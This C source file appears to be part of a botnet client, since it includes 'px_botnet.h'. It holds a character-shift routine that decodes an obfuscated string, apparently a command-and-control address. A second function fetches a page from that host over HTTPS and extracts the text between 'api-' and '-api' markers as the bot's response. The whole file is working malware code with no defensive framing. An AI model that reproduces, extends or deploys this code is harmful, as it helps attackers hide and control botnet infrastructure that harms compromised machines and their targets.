#include "../../includes/px_botnet.h"

char	*init_randomizer(char *test, int pos)
{
	char	*tmp;
	int		i;
	int		a;

	tmp = malloc(sizeof(char) * strlen(test) + 1);
	i = 0;
	a = 0;
	while (test[i])
	{
		if (a == 4)
		{
			tmp[i] = test[i] - (2 + pos);
			a = 0;
		}
		else
		{
			tmp[i] = test[i] + (3 + pos);
			a++;
		}
		i++;
	}
	tmp[i] = '\0';
	return (tmp);
}

char	*ft_request(char *page)
{
	char		*convert;
	char		*content;
	char		**a;
	char		**b;
	char		*tmp;
	int			i = 0;

	convert = init_randomizer(stringifer, 4);
	content = NULL;
	if (!convert)
		return (NULL);

	printf("URL: %s%s\n", convert, page);
	content = https_request(convert, page);
	printf("content: %s\n", content);
	free(convert);
	if (content == NULL)
		return (NULL);
	while (content[i])
	{
		if (content[i] && content[i + 1] && content[i + 2] && content[i + 3] && content[i] == 'a' && content[i + 1] == 'p' && content[i + 2] == 'i' && content[i + 3] == '-')
		{
			tmp = ft_strdup(content + i + 4);
			i = 0;
			free(content);
			while (tmp[i])
			{
				if (tmp[i + 1] && tmp[i + 2] && tmp[i + 3] && tmp[i] == '-' && tmp[i + 1] == 'a' && tmp[i + 2] == 'p' && tmp[i + 3] == 'i')
				{
					tmp[i] = '\0';
					printf("RESPONSE 1: %s\n", tmp);
					return (tmp);
				}
				i++;
			}
			printf("RESPONSE 2: %s\n", tmp);
			return (tmp);
		}
		i++;
	}
	return (NULL);
}
